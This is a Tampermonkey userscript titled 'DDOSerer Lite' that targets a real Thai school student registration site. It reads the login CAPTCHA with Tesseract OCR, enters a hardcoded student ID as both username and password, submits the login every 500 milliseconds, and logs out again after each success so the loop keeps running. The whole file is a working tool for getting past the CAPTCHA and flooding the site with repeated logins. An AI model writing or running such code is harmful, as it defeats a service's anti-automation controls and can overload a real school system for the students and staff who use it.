// ==UserScript==
// @name         DDOSerer Lite
// @version      1.0.0
// @description  Completely Rewritten!
// @namespace    http://tampermonkey.net/
// @match        https://skr.webactivity.online/*/
// @match        https://skr.webactivity.online/*/register_main.php
// @icon         https://www.google.com/s2/favicons?sz=64&domain=webactivity.online
// @license      GNU General Public License v3.0
// @require      https://cdn.jsdelivr.net/npm/tesseract.js@2.1.4
// ==/UserScript==

(function () {
	"use strict";
  
	const mainLists = ["https://skr.webactivity.online/student/"];
	const registerLists = ["https://skr.webactivity.online/student/register_main.php",];
	const logoutLists = ["https://skr.webactivity.online/student/register_logout.php",];
  
	const AlwaysLogout = true;
	const HostID = 52545;
	const GeneratorEnabled = true;
	const GeneratorInterval = 500;
  
	async function DecodeCaptcha() {
	  try {
		const captchaImage = document.querySelector("#imgCaptcha");
		if (!captchaImage) {
		  throw new Error("Error: CAPTCHA image not found");
		}
  
		const {
		  data: { text },
		} = await Tesseract.recognize(captchaImage.src, "eng", {
		  tessedit_char_whitelist: "0123456789",
		});
  
		const captchaValue = text.replace(/\D/g, "");
		if (captchaValue.length === 5) {
		  return captchaValue;
		} else {
		  throw new Error("Error: CAPTCHA length is not 5 digits");
		}
	  } catch (error) {
		throw error;
	  }
	}
  
	async function Inputter() {
	  try {
		const captchaValue = await DecodeCaptcha();
		const studentIDInput = document.querySelector('input[placeholder="เลขประจำตัวนักเรียน 5 หลัก"]');
		const passwordInput = document.querySelector('input[placeholder="รหัสผ่านที่โรงเรียนกำหนด"]');
		const captchaInput = document.querySelector('input[placeholder="พิมพ์ตัวเลขที่ปรากฏ"]');
  
		if (studentIDInput) {
		  studentIDInput.value = HostID;
		} else {
		  throw new Error("Error: Student ID input field not found!");
		}
		if (passwordInput) {
		  passwordInput.value = HostID;
		} else {
		  throw new Error("Error: Password input field not found!");
		}
		if (captchaInput) {
		  captchaInput.value = captchaValue;
		} else {
		  throw new Error("Error: CAPTCHA input field not found or CAPTCHA value is empty!");
		}
	  } catch (error) {throw error;}
	}
  
	async function AutoSubmit() {
	  try {
		const studentIDInput = document.querySelector('input[placeholder="เลขประจำตัวนักเรียน 5 หลัก"]');
		const passwordInput = document.querySelector('input[placeholder="รหัสผ่านที่โรงเรียนกำหนด"]');
		const captchaInput = document.getElementById("inCaptcha");
  
		if (!studentIDInput.value || !passwordInput.value){await Inputter();}
		if (!captchaInput || captchaInput.value.trim() === ""){const captchaValue = await DecodeCaptcha();
		  if (captchaValue){captchaInput.value = captchaValue;
		  } else {throw new Error("Error decoding captcha or decoded captcha is empty.");}
		}
		const submitButton = document.getElementById("Submit");
		if (submitButton){submitButton.click();}
	  } catch (error){location.reload();}
	}
  
	function CheckAndPerformActions() {
	  const currentUrl = window.location.href;
	  if (registerLists.includes(currentUrl)) {
		if (AlwaysLogout) {window.location.href = logoutLists[0];}
	  } else if (mainLists.includes(currentUrl)) {
		Inputter();
		if (GeneratorEnabled){setInterval(AutoSubmit, GeneratorInterval);}
	  }
	}
  
	window.addEventListener("load", () => {CheckAndPerformActions();});
  })();